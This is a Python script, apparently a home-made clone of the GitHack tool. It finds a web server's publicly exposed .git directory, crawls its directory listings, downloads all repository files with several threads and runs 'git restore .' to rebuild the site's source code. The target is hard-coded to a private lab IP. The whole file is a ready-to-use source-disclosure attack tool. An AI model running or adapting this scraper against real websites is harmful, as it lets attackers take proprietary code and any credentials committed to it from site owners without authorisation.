#!/usr/bin/python
# -*- coding: UTF-8 -*-
"""
@author:zyc
@file:mygithack.py
@time:2021/01/25
"""
import requests
import threading
import os
import time
import re
import queue
from lxml import etree
#
# def sorturl(url_list):
#     for url in url_list[1:]:
#         if url[-1] != '/':
#             file_url.append(url)
#         else:
#             dir_url.append(url)
# file_url=[]
# dir_url = []
#
# start_url = 'http://192.168.1.107/.git/'
# resp = requests.get(start_url)
# html = etree.HTML(resp.text)
# href = html.xpath('//td/a/@href')
# folder ='./' + re.findall("//(.*)",start_url)[0]
# url_list = [start_url+path for path in href]
# sorturl(url_list)
# print(file_url)
# print(dir_url)
# exit()

# def getfileurl(url):
#     r=requests.get(url)
#     html=etree.HTML(r.text)
#     url_list = [start_url+path for path in href]
#
# def downloadFile(url,filename):
#     r = requests.get(url)
#     data = r.content
#     with open(filename,'wb') as f:
#         f.write(data)
#

# class myThread (threading.Thread):
#     def __init__(self, url, filename):
#         threading.Thread.__init__(self)
#         self.url = url
#         self.filename = filename
#
#     def run(self):
#         downloadFile(self.imgSrc, self.directoryName)
class Githack:
    def __init__(self,start_url):
        self.start_url = start_url if start_url[-1] =='/' else start_url+'/'
        self.file_url = []
        self.dir_url = []
        self.file_queue = queue.Queue()
        self.dir_queue = queue.Queue()

    def requestTarget(self,url):
        resp = requests.get(url)
        html = etree.HTML(resp.text)
        href = html.xpath('//td/a/@href')
        url_list = [self.start_url + path for path in href]
        return url_list

    def sortUrl(self,urllist):
        for url in urllist[1:]:
            if url[-1] != '/':
                #可以处理一下在存入文件路径，方便后面直接用
                self.file_url.append(url)
                self.file_queue.put(url)
            else:
                # 可以处理一下在存入文件路径，方便后面直接用
                self.dir_url.append(url)
                self.dir_queue.put(url)
    def urltopath(self,url):
        path ='./' + re.findall(r'//(.*)',url)[0]
        # print("wwwwwwwwwwwwww",path)
        return path
    def download(self):
        while True:

            url = self.file_queue.get()
            if url == None:
                break
            print("[+]正在下载", url)
            r = requests.get(url)
            path = self.urltopath(url)
            if not os.path.exists(os.path.dirname(path)):
                try:
                    os.makedirs(os.path.dirname(path))
                except Exception:
                    print("已经存在")
            with open(path,'wb') as f:
                f.write(r.content)
    def requestdir(self):
        print("正在访问文件夹")
        while True:
            dirurl = self.dir_queue.get()
            if dirurl == None:
                break
            print("正在访问",dirurl)
            r=requests.get(dirurl)
            html = etree.HTML(r.text)
            href = html.xpath('//td/a/@href')
            urllist = [dirurl + path for path in href]
            if len(urllist)>1:
                self.sortUrl(urllist)
            else:
                print("创建文件夹")
                try:
                    os.makedirs(self.urltopath(dirurl))
                except Exception:
                    print("文件夹已经存在")
    def watch(self):
        while True:
            if self.dir_queue.empty() and self.file_queue.empty():
                time.sleep(3)
                if self.dir_queue.empty() and self.file_queue.empty():
                    self.dir_queue.put(None)
                    self.file_queue.put(None)
                    break




if __name__ == '__main__':
    import threading
    from git import Git

    starturl = 'http://192.168.1.107/.git/'
    g=Githack('http://192.168.1.107/.git/')
    url_list = g.requestTarget(g.start_url)
    g.sortUrl(url_list)
    print(g.file_url)
    print(g.dir_url)
    # while True:
    t2 = threading.Thread(target=g.requestdir, args=())
    t1 = threading.Thread(target=g.download, args=())
    t3 = threading.Thread(target=g.watch)
    t1.start()
    t2.start()
    t3.start()
    t1.join()
    t2.join()
    t3.join()

    print("file download over")
    dirname = re.findall(r'//(.*?)/',starturl)[0]
    print(dirname)
    r = Git('./'+dirname)
    r.execute('git restore .')
